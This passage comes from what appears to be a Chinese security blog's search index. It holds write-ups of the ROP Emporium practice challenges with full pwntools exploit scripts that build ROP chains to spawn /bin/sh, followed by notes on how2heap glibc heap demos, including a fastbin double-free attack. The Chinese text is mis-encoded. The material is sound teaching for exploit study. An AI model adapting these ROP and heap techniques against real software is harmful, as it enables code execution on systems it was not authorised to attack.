·çš„è¯­å¥æ¥æ‰§è¡Œå†™æ“ä½œï¼Œå› æ­¤æˆ‘ä»¬æœç´¢ä¸€ä¸‹ï¼š $ ROPgadget --binary write4 --only 'mov|pop|ret' Gadgets information ============================================================ 0x0000000000400713 : mov byte ptr [rip + 0x20096e], 1 ; ret 0x0000000000400821 : mov dword ptr [rsi], edi ; ret 0x00000000004007ae : mov eax, 0 ; pop rbp ; ret 0x0000000000400820 : mov qword ptr [r14], r15 ; ret 0x000000000040088c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040088e : pop r13 ; pop r14 ; pop r15 ; ret 0x0000000000400890 : pop r14 ; pop r15 ; ret 0x0000000000400892 : pop r15 ; ret 0x0000000000400712 : pop rbp ; mov byte ptr [rip + 0x20096e], 1 ; ret 0x000000000040088b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x000000000040088f : pop rbp ; pop r14 ; pop r15 ; ret 0x00000000004006b0 : pop rbp ; ret 0x0000000000400893 : pop rdi ; ret 0x0000000000400891 : pop rsi ; pop r15 ; ret 0x000000000040088d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004005b9 : ret æŒ‰ç…§ä¸Šè¿°éœ€æ±‚ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©å¸ƒç½®å¥½æ ˆï¼Œæ‰§è¡Œ pop r14 ; pop r15 ; ret æ§åˆ¶ r14 å’Œ r15ï¼Œéšå mov qword ptr [r14], r15 ; ret è¿›è¡Œå†™æ“ä½œï¼Œæœ€å pop rdi ; ret æŠŠå†™å¥½çš„ /bin/shï¼ˆæ€»è§‰å¾—æ‹¿åˆ° shell æ¯”è¯»åˆ° flag æ›´å‰å®³ä¸€ç‚¹ï¼‰ä½œä¸ºå‚æ•°ä¼ å…¥ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯å­—ç¬¦ä¸²éœ€è¦ 8 å­—èŠ‚å¯¹é½ã€‚ from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = process('./write4') elf = ELF('./write4') p.recvuntil('\u003e') got_start = 0x601000 pop_r14_r15_ret = 0x400890 mov_r14_r15_ret = 0x400820 pop_rdi_ret = 0x400893 payload = flat(['a'*0x28, pop_r14_r15_ret, got_start,'/bin/sh'.ljust(8,'\\x00'), mov_r14_r15_ret, pop_rdi_ret, got_start, elf.plt['system']]) p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:4:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"badchars é¢˜ç›®å±è”½äº†ä¸€äº›å…³é”®å­—ç¬¦ï¼Œå¹¶æç¤ºäº† XORï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥å…ˆå†™å…¥è¢«å¼‚æˆ–çš„å…³é”®å­—ç¬¦ï¼Œéšåé€šè¿‡ gadgets æŠŠå®ƒä»¬å¼‚æˆ–å›æ¥ã€‚ é¢˜ç›®å‘Šè¯‰äº†æˆ‘ä»¬è¢«å±è”½çš„å­—ç¬¦ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ --badbytes é€‰é¡¹é¿å…æŒ‡ä»¤åœ°å€ä¸­å«æœ‰è¿™äº›å­—ç¬¦ï¼š $ ROPgadget --binary badchars --only 'mov|pop|ret' --badbytes '62|69|63|2f|20|66|6e|73' éšåï¼Œæˆ‘ä»¬æ„é€ å¼‚æˆ–å­—ç¬¦ä¸²ï¼Œä¸ 2 å¼‚æˆ–å³å¯ï¼š s = '/bin/sh'.ljust(8,'\\x00') for i in range(len(s)): print hex(ord(s[i]) ^ 2) å¾—åˆ°ï¼š bin_sh = 0x026a712d6c6b602d æ³¨æ„åé¢ä¼šè¢«è®¤ä¸ºæ˜¯å°ç«¯æ³•ï¼Œæ‰€ä»¥è¿™é‡Œå€’åºå†™ã€‚ ç„¶åï¼Œæˆ‘ä»¬æŒ‘é€‰å¦‚ä¸‹çš„ gadgetsï¼š pop r12 ; pop r13 ; ret mov qword ptr [r13], r12 ; ret pop r14 ; pop r15 ; ret xor byte ptr [r15], r14b ; ret pop rdi ; ret ç¬¬ 1,2,5 è¡Œå’Œå‰é¢ä¸€æ ·ï¼Œè€Œç¬¬ 3-4 è¡Œæ§åˆ¶å¯„å­˜å™¨ r14 å’Œ r15 çš„å€¼ï¼Œä½¿å¾— r14=2ï¼ˆr14b å³ r14 çš„ä½ 8 ä½ï¼‰ï¼Œr15 å­˜æ”¾æˆ‘ä»¬åˆšåˆšå†™å…¥çš„è¢«å¼‚æˆ–çš„å­—ç¬¦ä¸²åœ°å€ï¼Œéšåè¿›è¡Œ 8 æ¬¡å¼‚æˆ–å³å¯æ¢å¤å‡º /bin/sh\\x00 æ¥ã€‚ from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = process('./badchars') elf = ELF('./badchars') p.recvuntil('\u003e') bin_sh = 0x026a712d6c6b602d got_start = 0x601000 pop_r12_r13_ret = 0x400b3b mov_r13_r12_ret = 0x400b34 pop_r14_r15_ret = 0x400b40 xor_r15_r14b_ret = 0x400b30 pop_rdi_ret = 0x400b39 payload = flat(['a'*0x28, pop_r12_r13_ret, bin_sh, got_start, mov_r13_r12_ret]) for i in range(8): payload += flat([pop_r14_r15_ret, 2, got_start+i, xor_r15_r14b_ret]) payload += flat([pop_rdi_ret, got_start, elf.plt['system']]) p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:5:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fluff æœ¬é¢˜å‡å°‘äº†ä¸€äº› gadgetï¼Œæˆ‘ä»¬ä¸å¾—ä¸é—´æ¥åœ°é€šè¿‡å¯„å­˜å™¨å†™å†…å­˜ã€‚æ³¨æ„è¿™é‡Œç”¨ ROPgadget å¾ˆéš¾æ‰¾åˆ°åˆé€‚çš„ gadgetï¼Œéœ€è¦åŠ ä¸ª --depth å‚æ•°ã€‚ $ ROPgadget --binary fluff --depth 20 åœ¨ä¼—å¤š gadget ä¸­è¦æ‰¾åˆ°æœ‰ç”¨çš„ï¼Œæˆ‘ä»¬çš„æ€è·¯è¿˜æ˜¯å¦‚ä½•å»å†™å†…å­˜ã€‚æŒ‰ç…§ä¹‹å‰ç»éªŒï¼Œè¿˜æ˜¯éœ€è¦ mov [reg], reg çš„è¯­å¥ï¼Œè¿™é‡Œå°±æœ‰ä¸€ä¸ªï¼š 0x000000000040084e : mov qword ptr [r10], r11 ; pop r13 ; pop r12 ; xor byte ptr [r10], r12b ; ret ä½†æ˜¯å¾ˆä¸å·§ï¼Œæ²¡æœ‰ pop r10; pop r11; ret è¿™ä¹ˆå¥½çš„ gadget äº†ï¼Œæˆ‘ä»¬åªèƒ½å¦è¾Ÿè¹Šå¾„å»æ§åˆ¶è¿™ä¸¤ä¸ªå¯„å­˜å™¨ã€‚é¦–å…ˆæˆ‘ä»¬è¦æŠŠ GOT è¡¨åœ°å€æ”¾è¿› r10ã€‚ç„¶è€Œæˆ‘ä»¬è¿ xor r10, reg è¿™æ ·çš„è¯­å¥éƒ½æ²¡æœ‰ï¼Œéå¸¸éš¾å—ï¼ˆxor [r10], reg æ˜¯æ²¡æœ‰ç”¨çš„ï¼Œå› ä¸ºæ— æ³•æ”¹å˜ r10 æœ¬èº«ï¼‰ã€‚ ä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°ï¼Œæœ‰è¿™æ ·ä¸€ä¸ª gadgetï¼š 0x0000000000400840 : xchg r11, r10 ; pop r15 ; mov r11d, 0x602050 ; ret è¿™é‡Œå¯ä»¥äº¤æ¢ r11 å’Œ r10 çš„å€¼ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥é€šè¿‡æ§åˆ¶ r11ï¼Œç„¶åæœ€åè®©å®ƒå’Œ r10 äº¤æ¢ä»è€Œæ§åˆ¶ r10 å‘¢ï¼Ÿ æˆ‘ä»¬å‘ç°æ˜¯å¯ä»¥çš„ï¼Œå› ä¸ºæœ‰ï¼š 0x0000000000400822 : xor r11, r11 ; pop r14 ; mov edi, 0x601050 ; ret 0x000000000040082f : xor r11, r12 ; pop r12 ; mov r13d, 0x604060 ; ret è¿™ä¸¤ä¸ª gadget è®©æˆ‘ä»¬æƒ³åˆ°ï¼šæˆ‘ä»¬å¯ä»¥å…ˆé€šè¿‡ç¬¬ä¸€ä¸ª gadget æ¸…é›¶ r11ï¼Œç„¶åç”¨ç¬¬äºŒä¸ª gadget è®© r11 å’Œ r12 å¼‚æˆ–ï¼Œæ­¤æ—¶å°±ç­‰åŒäº mov r11, r12 äº†ã€‚è€Œ r12 æ˜¯å¾ˆå¥½æ§åˆ¶çš„ï¼š 0x0000000000400832 : pop r12 ; mov r13d, 0x604060 ; ret è¿™æ ·å°±å¯ä»¥æ„é€  ROP é“¾å…ˆæŠŠåœ°å€å†™å…¥ r10ï¼š got_start = 0x601000 xor_r11_r11 = 0x400822 pop_r12 = 0x400832 xor_r11_r12 = 0x40082f xchg_r11_r10 = 0x400840 payload = flat(['a'*40, xor_r11_r11,'a'*8, pop_r12, got_start, xor_r11_r12,'a'*8, xchg_r11_r10,'a'*8]) è¿™é‡Œçš„ 'a'*8 æ˜¯ä¸ºäº†è§£å†³åé¢çš„æ— ç”¨ popã€‚ ç¬¬äºŒæ­¥ï¼Œå‘ r11 å†™å…¥ /bin/sh\\x00ï¼Œå…¶å®å’Œä¸Šé¢åŒç†ï¼š payload += flat([xor_r11_r11,'a'*8, pop_r12,'/bin/sh'.ljust(8,'\\x00'), xor_r11_r12,'a'*8]) ç¬¬ä¸‰æ­¥ï¼Œå‘ r10 ä¸­çš„åœ°å€å†™å…¥ r11 ä¸­çš„æ•°æ®ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯ç”±äºè¯¥ gadget ååŠéƒ¨åˆ†ä¼š pop r12 å¹¶ä¸”å°† r12 ä¹Ÿå»å’Œ r10 ä¸­çš„åœ°å€å­˜æ”¾çš„å€¼å¼‚æˆ–ï¼Œæ­¤æ—¶æˆ‘ä»¬å¿…é¡»æ§åˆ¶ r12 ä¸º 0ï¼š mov_r10_r11 = 0x40084e pop_rdi_ret = 0x4008c3 payload += flat([mov_r10_r11,'a'*8, 0, pop_rdi_ret, got_start, elf.plt['system']]) ","date":"2019-12-09","objectID":"/rop-emporium/:6:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"pivot stack pivoting å°±æ˜¯åœ¨æ ˆç©ºé—´è¾ƒå°çš„æƒ…å†µä¸‹ï¼ŒæŠŠ esp ç§»åˆ°åˆ«çš„åœ°æ–¹å»ï¼Œè¿™æ ·å°±èƒ½æœ‰æ›´å¤šç©ºé—´å†™ ROP é“¾äº†ã€‚ è¿™ä¸€å…³å¤§æ„æ˜¯è¦è°ƒç”¨ libpivot.so ä¸­çš„ ret2win å‡½æ•°ï¼Œä¹Ÿå°±æ˜¯ç¬¬ä¸€å…³çš„é‚£ä¸ªã€‚æ­¤å¤–ï¼Œè¿˜æœ‰ä¸ª uselessFunction é‡Œè°ƒç”¨äº† libpivot.so é‡Œçš„ foothold_functionã€‚ IDA å¾—åˆ°çš„æºç å¦‚ä¸‹ï¼š int __cdecl main(int argc, const char **argv, const char **envp) { char *ptr; // ST08_8 setvbuf(stdout, 0LL, 2, 0LL); setvbuf(stderr, 0LL, 2, 0LL); puts(\"pivot by ROP Emporium\"); puts(\"64bits\\n\"); ptr = (char *)malloc(0x1000000uLL); pwnme(ptr + 16776960); free(ptr); puts(\"\\nExiting\"); return 0; } char *__fastcall pwnme(char *a1) { char s; // [rsp+10h] [rbp-20h] memset(\u0026s, 0, 0x20uLL); puts(\"Call ret2win() from libpivot.so\"); printf(\"The Old Gods kindly bestow upon you a place to pivot: %p\\n\", a1); puts(\"Send your second chain now and it will land there\"); printf(\"\u003e \"); fgets(a1, 256, stdin); puts(\"Now kindly send your stack smash\"); printf(\"\u003e \", 256LL); return fgets(\u0026s, 64, stdin); } æ³¨æ„åˆ°è¿™é‡Œçš„ a1 ä¼šè¢«æ‰“å°å‡ºæ¥ï¼Œéšåè¢« fgets å†™å…¥ã€‚æˆ‘ä»¬æƒ³å°è¯•è®© rsp æŒ‡å‘ a1 æ¥æ”¹å˜ rsp ä½ç½®ã€‚è¿™ä¸ªæ¯”è¾ƒç®€å•ï¼Œåªéœ€è¦ gadgetï¼š pop rax; ret xchg rax, rsp; ret é€šè¿‡ pop rax æŠŠ a1 çš„åœ°å€å†™å…¥ raxï¼Œç„¶åäº¤æ¢ï¼Œé‚£ä¹ˆ rsp å°±æŒ‡å‘äº† a1ï¼Œæˆ‘ä»¬å®Œæˆäº† stack pivotingã€‚ è¿™é¢˜å®¹æ˜“ææ··çš„åœ°æ–¹æ˜¯ï¼Œæˆ‘ä»¬çš„æ€è·¯æ˜¯å…ˆå¡« first stage è¿›è¡Œ stack pivotingï¼ˆä¹Ÿå°±æ˜¯ä¸Šè¿°è¿‡ç¨‹ï¼‰ï¼Œå†å¡« second stage è°ƒç”¨ ret2winï¼Œä½†æ˜¯ç¨‹åºä¸­è¾“å…¥çš„é¡ºåºæ˜¯ç›¸åçš„ã€‚ ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ second stageï¼Œä¹Ÿå°±æ˜¯è€ƒè™‘æˆ‘ä»¬è¦å…ˆè¾“å…¥ä»€ä¹ˆã€‚æˆ‘ä»¬æœ€ç»ˆè‚¯å®šæ˜¯æƒ³è¿”å›åˆ° ret2winï¼Œä½†æ˜¯æˆ‘ä»¬ä¸çŸ¥é“å®ƒçš„åœ°å€ã€‚checksec libpivot.so å¯ä»¥å‘ç°è¿˜å¼€å¯äº† ASLRã€‚å› æ­¤å¯ä»¥æƒ³åˆ°è¿™é‡Œ foothold_function å°±æ˜¯ç”¨æ¥å®šä½ç”¨çš„ã€‚ é¦–å…ˆï¼ˆé€šè¿‡ .pltï¼‰è°ƒç”¨ä¸€æ¬¡ foothold_function æ›´æ–°å…¶ .got.pltï¼Œéšåå°†è¿™ä¸ª .got.plt é¡¹çš„åœ°å€ pop ç»™ raxï¼Œæ¥ç€è¯»å– [rax] ä¹Ÿå°±æ˜¯è¿™ä¸ª .got.plt é¡¹çš„å†…å®¹ï¼Œå³å¾—åˆ°äº† foothold_function çœŸå®åœ°å€ã€‚ æœ€åï¼Œå¯ä»¥æ ¹æ®å®ƒåœ¨ libpivot.so ä¸­åˆ° ret2win çš„ç›¸å¯¹åç§»æ¥æ‹¿åˆ° ret2win çš„çœŸå®åœ°å€ã€‚è¿™ä¸ªç›¸å¯¹åç§»å¯ä»¥é€šè¿‡ nm libpivot.so å¾—åˆ°ï¼šå‰è€…åœ¨ 0x0970ï¼Œåè€…åœ¨ 0x0abeï¼Œç›¸å·® 0x14eã€‚æœ€åæˆ‘ä»¬è¿˜æ˜¯åˆ©ç”¨ gadget è®¡ç®—å‡º ret2win çš„çœŸå®åœ°å€åï¼Œcall ä¸€ä¸‹å³å¯ã€‚ from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = process('./pivot') elf = ELF('./pivot') p.recvuntil('pivot:') a1 = int(p.recvuntil('\\n'), 16) print hex(a1) foothold_plt = elf.plt['foothold_function'] foothold_got = elf.got['foothold_function'] pop_rax_ret = 0x400b00 mov_rax_rax = 0x400b05 pop_rbp_ret = 0x400900 add_rax_rbp = 0x400b09 call_rax = 0x40098e payload = flat([foothold_plt, pop_rax_ret, foothold_got, mov_rax_rax, pop_rbp_ret, 0x14e, add_rax_rbp, call_rax]) p.recvuntil('\u003e') p.sendline(payload) xchg_rax_rsp = 0x400b02 payload = flat(['a'*0x28, pop_rax_ret, a1, xchg_rax_rsp]) p.recvuntil('\u003e') p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:7:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"ret2csu è¿™é¢˜è¦æ±‚æˆ‘ä»¬è°ƒç”¨ ret2win ä½†æ˜¯ç¬¬ä¸‰ä¸ªå‚æ•°å¿…é¡»æ˜¯ 0xdeadcafebabebeefï¼Œå¹¶ä¸” ROPgadget å‡ ä¹æ‰¾ä¸åˆ°æœ‰ç”¨çš„ gadget æ¯”å¦‚ pop rdx; retã€‚ç»“åˆé¢˜ç›®åå¯çŸ¥æœ¬é¢˜éœ€è¦é‡‡ç”¨ ret2csu çš„æŠ€å·§ã€‚ åœ¨ __libc_csu_init ä¸­ï¼Œæœ‰ gadget1ï¼š pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn å’Œ gadget2ï¼š mov rdx, r15 mov rsi, r14 mov edi, r13d call qword ptr [r12+rbx*8] å¯ä»¥çœ‹åˆ°ï¼Œè¿™é‡Œ rdx, rsi, edi æ­£å¥½æ˜¯ 64 ä½ä¸‹å‡½æ•°çš„å‰ä¸‰ä¸ªå‚æ•°ï¼Œè€Œå®ƒä»¬çš„å€¼åœ¨è¿™é‡Œæ¥æºäº r15, r14, r13dï¼Œåä¸‰è€…åˆæ°å¥½å¯ä»¥è¢« gadget1 æ§åˆ¶ï¼›è€Œæœ€åä¸€å¥ call ä¸­çš„ r12 å’Œ rbx æˆ‘ä»¬åŒæ ·å¯ä»¥åœ¨ gadget1 ä¸­æ§åˆ¶ã€‚ ç„¶è€Œï¼Œgadget2 ä¸æ˜¯ä»¥ ret ç»“å°¾çš„ï¼Œè¿™æ ·æˆ‘ä»¬å¿…é¡»è€ƒè™‘å®ƒåé¢çš„æ±‡ç¼–ä»£ç ä¾æ—§èƒ½æ­£å¸¸æ‰§è¡Œä¸‹å»ï¼š add rbx, 1 cmp rbp, rbx jnz short loc_400880 add rsp, 8 pop rbx pop rbp pop r12 pop r13 pop r14 pop r15 retn è¿™é‡Œä¸ºäº†è®©å®ƒç»§ç»­å‘ä¸‹æ‰§è¡Œï¼Œæˆ‘ä»¬ä¸å¦¨è®© rbx=0; rbp=1ï¼›è‡³äºä¸‹é¢å¤šä½™çš„ pop å°±ç”¨å¡«å……å¤„ç†æ‰å°±å¥½äº†ã€‚ æœ€åè¿˜æœ‰ä¸€ä¸ª call qword ptr [r12+rbx*8] æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œä½†æ˜¯è¿™é‡Œå°è¯•è°ƒç”¨ ret2win æ˜¯ä¼šå¼•èµ·æ®µé”™è¯¯çš„ï¼Œä¸èƒ½ç›´æ¥è°ƒç”¨ã€‚æˆ‘ä»¬åªæœ‰ä¸å¼•èµ·æ®µé”™è¯¯ï¼Œæ‰èƒ½è®© gadget2 æˆåŠŸæ‰§è¡Œåˆ° retï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æƒ³éšä¾¿è°ƒç”¨ä¸€ä¸ªä¸ä¼šæ”¹å˜ rdx çš„å€¼çš„å‡½æ•°ã€‚ ä¾‹å¦‚ï¼Œå¯ä»¥è°ƒç”¨ .dynamic æ®µçš„ _finiï¼Œè¿™ä¸ªå‡½æ•°éå¸¸ç®€å•ï¼š sub rsp,0x8 add rsp,0x8 ret é‚£ä¹ˆæˆ‘ä»¬æ§åˆ¶ r12 æŒ‡å‘ _fini å³å¯ï¼Œå› ä¸º rbx ä¼šè¢«æˆ‘ä»¬è®¾ç½®ä¸º 0 æ‰€ä»¥ä¸ç”¨è€ƒè™‘ã€‚æ³¨æ„æ˜¯æŒ‡å‘ï¼Œä¹Ÿå°±æ˜¯è¯´ [r12] æ‰æ˜¯ _fini çš„åœ°å€ï¼Œåè€…å¯ä»¥ gdb ä¸­ info func å¾—åˆ°åœ¨ 0x4008b4ï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦èµ‹å€¼ç»™ r12 çš„å®é™…ä¸Šæ˜¯æŒ‡å‘ 0x4008b4 è¿™ä¸ªåœ°å€çš„æŒ‡é’ˆã€‚ æˆ‘ä»¬å¯ä»¥è¿™æ ·çœ‹ï¼š pwndbg\u003e x/20x \u0026_DYNAMIC 0x600e20: 0x00000001 0x00000000 0x00000001 0x00000000 0x600e30: 0x0000000c 0x00000000 0x00400560 0x00000000 0x600e40: 0x0000000d 0x00000000 0x004008b4 0x00000000 0x600e50: 0x00000019 0x00000000 0x00600e10 0x00000000 0x600e60: 0x0000001b 0x00000000 0x00000008 0x00000000 å¯ä»¥çœ‹åˆ°åœ¨ 0x600e48 çš„æŒ‡é’ˆæŒ‡å‘ 0x4008b4ï¼Œè¿™å°±æ˜¯æˆ‘ä»¬è¦èµ‹å€¼ç»™ r12 çš„å€¼ã€‚ from pwn import * context(arch='amd64', os='linux', log_level='DEBUG') p = process('./ret2csu') elf = ELF('./ret2csu') p.recvuntil('\u003e') ret2win = elf.symbols['ret2win'] gadget1 = 0x40089a gadget2 = 0x400880 fini_p = 0x600e48 arg3 = 0xdeadcafebabebeef payload = flat(['a'*0x28, gadget1, 0, 1, fini_p, 0, 0, arg3, gadget2,0,0,0,0,0,0,0, ret2win]) p.sendline(payload) p.interactive() ","date":"2019-12-09","objectID":"/rop-emporium/:8:0","tags":["æ ˆæ¼æ´"],"title":"ROP Emporium ç»ƒä¹ è®°å½•","uri":"/rop-emporium/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"è·ç¦»æ–‡ç« å‘å¸ƒä¸¤ä¸ªå¤šæœˆåï¼Œç»ˆäºæ›´æ–°å®Œå•¦ï¼ ","date":"2019-12-09","objectID":"/how2heap/:0:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"first_fit æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e int main() { fprintf(stderr,\"This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.\\n\"); fprintf(stderr,\"glibc uses a first-fit algorithm to select a free chunk.\\n\"); fprintf(stderr,\"If a chunk is free and large enough, malloc will select this chunk.\\n\"); fprintf(stderr,\"This can be exploited in a use-after-free situation.\\n\"); fprintf(stderr,\"Allocating 2 buffers. They can be large, don't have to be fastbin.\\n\"); char* a = malloc(0x512); char* b = malloc(0x256); char* c; fprintf(stderr,\"1st malloc(0x512): %p\\n\", a); fprintf(stderr,\"2nd malloc(0x256): %p\\n\", b); fprintf(stderr,\"we could continue mallocing here...\\n\"); fprintf(stderr,\"now let's put a string at a that we can read later \\\"this is A!\\\"\\n\"); strcpy(a,\"this is A!\"); fprintf(stderr,\"first allocation %p points to %s\\n\", a, a); fprintf(stderr,\"Freeing the first one...\\n\"); free(a); fprintf(stderr,\"We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at %p\\n\", a); fprintf(stderr,\"So, let's allocate 0x500 bytes\\n\"); c = malloc(0x500); fprintf(stderr,\"3rd malloc(0x500): %p\\n\", c); fprintf(stderr,\"And put a different string here, \\\"this is C!\\\"\\n\"); strcpy(c,\"this is C!\"); fprintf(stderr,\"3rd allocation %p points to %s\\n\", c, c); fprintf(stderr,\"first allocation %p points to %s\\n\", a, a); fprintf(stderr,\"If we reuse the first allocation, it now holds the data from the third allocation.\\n\"); } è¾“å‡ºï¼š This file doesn't demonstrate an attack, but shows the nature of glibc's allocator. glibc uses a first-fit algorithm to select a free chunk. If a chunk is free and large enough, malloc will select this chunk. This can be exploited in a use-after-free situation. Allocating 2 buffers. They can be large, don't have to be fastbin. 1st malloc(0x512): 0x121f010 2nd malloc(0x256): 0x121f530 we could continue mallocing here... now let's put a string at a that we can read later\"this is A!\" first allocation 0x121f010 points to this is A! Freeing the first one... We don't need to free anything again. As long as we allocate smaller than 0x512, it will end up at 0x121f010 So, let's allocate 0x500 bytes 3rd malloc(0x500): 0x121f010 And put a different string here, \"this is C!\" 3rd allocation 0x121f010 points to this is C! first allocation 0x121f010 points to this is C! If we reuse the first allocation, it now holds the data from the third allocation. è¿™ä¸ªä¾‹å­å¾ˆç®€å•ï¼Œç”±äºåˆå§‹åˆ†é…ç»™ a çš„ 0x512 å­—èŠ‚åˆšåˆšè¢«é‡Šæ”¾ï¼Œæ­¤æ—¶åˆ†é…ä¸€å—å°äº 0x512 å­—èŠ‚çš„å†…å­˜å¿…å®šä¼šä½¿ç”¨åˆšæ‰ a ä½¿ç”¨çš„å†…å­˜åŒºåŸŸã€‚æ³¨æ„å¦‚æœæœ€åä½¿ç”¨è¢«é‡Šæ”¾çš„æŒ‡é’ˆ aï¼Œé‚£ä¹ˆå®ƒä»ç„¶æŒ‡å‘ this is C! å­—ç¬¦ä¸²ï¼Œè¿™å°±æ˜¯é€šå¸¸è¯´çš„ use after freeã€‚ ","date":"2019-12-09","objectID":"/how2heap/:1:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fastbin_dup æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { fprintf(stderr,\"This file demonstrates a simple double-free attack with fastbins.\\n\"); fprintf(stderr,\"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr,\"1st malloc(8): %p\\n\", a); fprintf(stderr,\"2nd malloc(8): %p\\n\", b); fprintf(stderr,\"3rd malloc(8): %p\\n\", c); fprintf(stderr,\"Freeing the first one...\\n\"); free(a); fprintf(stderr,\"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr,\"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr,\"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr,\"Now the free list has [%p, %p, %p]. If we malloc 3 times, we'll get %p twice!\\n\", a, b, a, a); fprintf(stderr,\"1st malloc(8): %p\\n\", malloc(8)); fprintf(stderr,\"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr,\"3rd malloc(8): %p\\n\", malloc(8)); } è¾“å‡ºï¼š This file demonstrates a simple double-free attack with fastbins. Allocating 3 buffers. 1st malloc(8): 0x17e9010 2nd malloc(8): 0x17e9030 3rd malloc(8): 0x17e9050 Freeing the first one... If we free 0x17e9010 again, things will crash because 0x17e9010 is at the top of the free list. So, instead, we'll free 0x17e9030. Now, we can free 0x17e9010 again, since it's not the head of the free list. Now the free list has [0x17e9010, 0x17e9030, 0x17e9010]. If we malloc 3 times, we'll get 0x17e9010 twice! 1st malloc(8): 0x17e9010 2nd malloc(8): 0x17e9030 3rd malloc(8): 0x17e9010 è¿™é‡Œå¦‚æœé‡Šæ”¾ a åå†é‡Šæ”¾å®ƒä¸€æ¬¡ï¼Œç”±äºå®ƒä½äº freelist é¡¶ç«¯è¿‡ä¸äº†å®‰å…¨æ£€æŸ¥ï¼Œå¾—åˆ°ï¼š *** Error in `./a.out': double free or corruption (fasttop): 0x00000000007aa010 *** è¿™å°±æ˜¯æˆ‘ä»¬è¯´çš„ double freeã€‚ç„¶è€Œæˆ‘ä»¬ç¬¬ä¸€æ¬¡é‡Šæ”¾ a åå¦‚æœå…ˆé‡Šæ”¾å¦ä¸€ä¸ªå— bï¼Œé‚£ä¹ˆ b å°±ä¼šä½äº freelist é¡¶éƒ¨ï¼Œæ­¤æ—¶å†æ¬¡é‡Šæ”¾ a å°±å¯ä»¥ç»•è¿‡ double free çš„æ£€æµ‹ã€‚è¿™æ ·åšçš„ç»“æœæ˜¯æœ€åç¬¬ä¸€æ¬¡å’Œç¬¬ä¸‰æ¬¡ malloc å¾—åˆ°çš„ä¸¤ä¸ªä¸åŒæŒ‡é’ˆæŒ‡å‘äº†ç›¸åŒçš„åœ°å€ã€‚ ","date":"2019-12-09","objectID":"/how2heap/:2:0","tags":["å †æ¼æ´"],"title":"how2heap å­¦ä¹ ","uri":"/how2heap/"},{"categories":["äºŒè¿›åˆ¶å®‰å…¨"],"content":"fastbin_dup_into_stack æºç ï¼š #include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e int main() { fprintf(stderr,\"This file extends on fastbin_dup.c by tricking malloc into\\n\" \"returning a pointer to a controlled location (in this case, the stack).\\n\"); unsigned long long stack_var; fprintf(stderr,\"The address we want malloc() to return is %p.\\n\", 8+(char *)\u0026stack_var); fprintf(stderr,\"Allocating 3 buffers.\\n\"); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr,\"1st malloc(8): %p\\n\", a); fprintf(stderr,\"2nd malloc(8): %p\\n\", b); fprintf(stderr,\"3rd malloc(8): %p\\n\", c); fprintf(stderr,\"Freeing the first one...\\n\"); free(a); fprintf(stderr,\"If we free %p again, things will crash because %p is at the top of the free list.\\n\", a, a); // free(a); fprintf(stderr,\"So, instead, we'll free %p.\\n\", b); free(b); fprintf(stderr,\"Now, we can free %p again, since it's not the head of the free list.\\n\", a); free(a); fprintf(stderr,\"Now the free list has [%p, %p, %p]. \" \"We'll now carry out our attack by modifying data at %p.\\n\", a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr,\"1st malloc(8): %p\\n\", d); fprintf(stderr,\"2nd malloc(8): %p\\n\", malloc(8)); fprintf(stderr,\"Now the free list has [%p].\\n\", a); fprintf(stderr,\"Now, we have access to %p while it remains at the head of the free list.\\n\" \"so now we are writing a fake free size (in this case, 0x20) to the 